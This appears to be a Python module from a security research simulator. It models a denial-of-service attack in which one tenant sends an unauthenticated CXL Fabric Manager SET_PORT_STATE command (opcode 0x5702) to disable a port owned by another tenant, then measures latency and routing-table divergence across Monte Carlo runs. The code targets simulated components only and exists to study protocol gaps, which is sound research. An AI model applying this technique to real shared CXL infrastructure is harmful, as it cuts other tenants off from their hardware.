"""
attacks/atk2_port_dos.py - ATK-2 PORTDOS Attack

Attack:   ATK-2 PORTDOS
Target:   CXL physical port state management
Gaps:     GAP-1 (no auth in FM API), GAP-3 (DRT/port state divergence)
Severity: High — denial-of-service against shared CXL infrastructure ports

Attack Narrative:
    CXL fabric deployments share physical ports among multiple tenants.  The
    FM SET_PORT_STATE command (opcode 0x5702) allows toggling a port between
    ENABLED and DISABLED.

    GAP-1: The SET_PORT_STATE payload contains no authentication field.  Any
    MCTP-reachable entity can issue this command targeting any port, including
    ports used exclusively by other tenants.

    GAP-3: After the attacker disables the port, the FM's software routing
    table retains the stale ENABLED state until a sync is triggered, creating
    an undetected divergence.

    Result: Tenant B (attacker) disables a physical port legitimately assigned
    to Tenant A, causing a denial-of-service.  The attack completes in a single
    FM command round-trip (~2.14 µs average measured latency).

Attack Steps:
    1. Setup:  FM enables shared_port_id and marks it as belonging to Tenant A.
    2. Attack: Attacker (Tenant B) issues SET_PORT_STATE(DISABLED) for shared_port.
    3. Effect: switch.ports[shared_port_id]['state'] == 'DISABLED'.
               Tenant A's workload loses port access.
    4. Check:  port_state_after == 'DISABLED'.
"""

import time
from typing import Any, Dict, List, Optional

from simulator.cxl_switch import FMAttackCxlSwitch
from simulator.fabric_manager import FMDaemon, OPCODE_SET_PORT_STATE
from simulator.devices import Tenant


class PortDoSAttack:
    """
    ATK-2 PORTDOS: Denial-of-service via unauthenticated port disable.

    An unprivileged Tenant B issues SET_PORT_STATE(DISABLED) for a physical
    port owned by Tenant A.  Because GAP-1 leaves the command unauthenticated,
    the FM complies immediately, severing Tenant A's CXL connectivity.

    Attributes:
        switch:            The CXL switch under test.
        fm:                The Fabric Manager daemon instance.
        tenant_a:          Victim tenant (owner of the target port).
        tenant_b_attacker: Attacker tenant.
        shared_port_id:    Physical port index to attack (default 1).
    """

    def __init__(self,
                 switch: FMAttackCxlSwitch,
                 fm: FMDaemon,
                 tenant_a: Tenant,
                 tenant_b_attacker: Tenant,
                 shared_port_id: int = 1) -> None:
        self.switch = switch
        self.fm = fm
        self.tenant_a = tenant_a
        self.tenant_b_attacker = tenant_b_attacker
        self.shared_port_id = shared_port_id

    # ------------------------------------------------------------------
    # Setup: establish pre-attack state
    # ------------------------------------------------------------------

    def setup(self) -> None:
        """
        Configure the fabric in the pre-attack legitimate state.

        Enables shared_port_id and records it as belonging to Tenant A.
        Synchronises routing tables so SW and HW state are consistent.
        """
        # Ensure port exists and is enabled
        if self.shared_port_id not in self.switch.ports:
            self.switch.ports[self.shared_port_id] = {
                'state': 'ENABLED',
                'tenant_id': self.tenant_a.tenant_id,
            }
        else:
            self.switch.ports[self.shared_port_id]['state'] = 'ENABLED'
            self.switch.ports[self.shared_port_id]['tenant_id'] = self.tenant_a.tenant_id

        # Record in tenant A's profile
        if self.shared_port_id not in self.tenant_a.owned_ports:
            self.tenant_a.owned_ports.append(self.shared_port_id)

        # Sync FM tables
        self.fm.sync_routing_tables()

    # ------------------------------------------------------------------
    # Execute: perform the attack
    # ------------------------------------------------------------------

    def execute(self) -> Dict[str, Any]:
        """
        Execute the PORTDOS attack.

        Records port state before/after and measures the core attack latency.

        Returns:
            dict with keys:
                'success'          (bool)  - attack succeeded (port disabled)
                'latency_us'       (float) - core attack latency µs
                'port_state_before'(str)   - port state before attack
                'port_state_after' (str)   - port state after attack
                'affected_tenants' (list)  - tenant IDs impacted
                'divergence_detected' (bool) - SW/HW divergence present
                'error'            (str)   - empty on success
        """
        port_info_before = self.switch.ports.get(
            self.shared_port_id, {'state': 'UNKNOWN', 'tenant_id': -1}
        )
        port_state_before: str = port_info_before['state']

        # Identify tenants that use this port (for impact reporting)
        affected_tenants: List[int] = [
            tid for pid, info in self.switch.ports.items()
            if pid == self.shared_port_id and info.get('tenant_id', -1) != -1
            for tid in [info['tenant_id']]
        ]
        if self.tenant_a.tenant_id not in affected_tenants:
            affected_tenants.append(self.tenant_a.tenant_id)

        # ---------------------------------------------------------------
        # CORE ATTACK: time starts here
        # Attacker issues SET_PORT_STATE(DISABLED) targeting victim's port.
        # GAP-1: no ownership check → command accepted unconditionally.
        # ---------------------------------------------------------------
        t0 = time.perf_counter()

        attack_result = self.fm.process_command(
            opcode=OPCODE_SET_PORT_STATE,
            payload={
                'port_id': self.shared_port_id,
                'state': 'DISABLED',
                'tenant_id': self.tenant_b_attacker.tenant_id,
            },
            src_eid=self.tenant_b_attacker.eid,
        )

        t1 = time.perf_counter()
        latency_us = (t1 - t0) * 1e6
        # ---------------------------------------------------------------

        port_info_after = self.switch.ports.get(
            self.shared_port_id, {'state': 'UNKNOWN'}
        )
        port_state_after: str = port_info_after['state']

        # GAP-3: FM sw_routing_table still believes port is ENABLED
        divergent_entries = self.switch.get_routing_divergence()
        divergence_detected = len(divergent_entries) > 0

        success = (
            attack_result['success']
            and port_state_after == 'DISABLED'
        )

        return {
            'success': success,
            'latency_us': latency_us,
            'port_state_before': port_state_before,
            'port_state_after': port_state_after,
            'affected_tenants': affected_tenants,
            'divergence_detected': divergence_detected,
            'divergent_entries': divergent_entries,
            'error': '' if success else f"port_state_after={port_state_after}",
        }

    # ------------------------------------------------------------------
    # Reset: restore fabric to pre-attack state
    # ------------------------------------------------------------------

    def reset(self) -> None:
        """
        Re-enable the disabled port and restore Tenant A's ownership.

        Called between Monte Carlo iterations to return the fabric to the
        pre-attack configuration.
        """
        if self.shared_port_id in self.switch.ports:
            self.switch.ports[self.shared_port_id]['state'] = 'ENABLED'
            self.switch.ports[self.shared_port_id]['tenant_id'] = (
                self.tenant_a.tenant_id
            )
        self.fm.sync_routing_tables()


# ---------------------------------------------------------------------------
# Module-level convenience function for Monte Carlo runner
# ---------------------------------------------------------------------------

def run_single_iteration(switch: FMAttackCxlSwitch,
                          fm: FMDaemon,
                          tenant_a: Tenant,
                          tenant_b: Tenant) -> Dict[str, Any]:
    """
    Run one complete iteration of ATK-2 PORTDOS.

    Args:
        switch:    FMAttackCxlSwitch instance.
        fm:        FMDaemon instance.
        tenant_a:  Victim tenant.
        tenant_b:  Attacker tenant.

    Returns:
        Result dict from PortDoSAttack.execute().
    """
    attack = PortDoSAttack(
        switch=switch,
        fm=fm,
        tenant_a=tenant_a,
        tenant_b_attacker=tenant_b,
    )
    attack.setup()
    result = attack.execute()
    attack.reset()
    return result
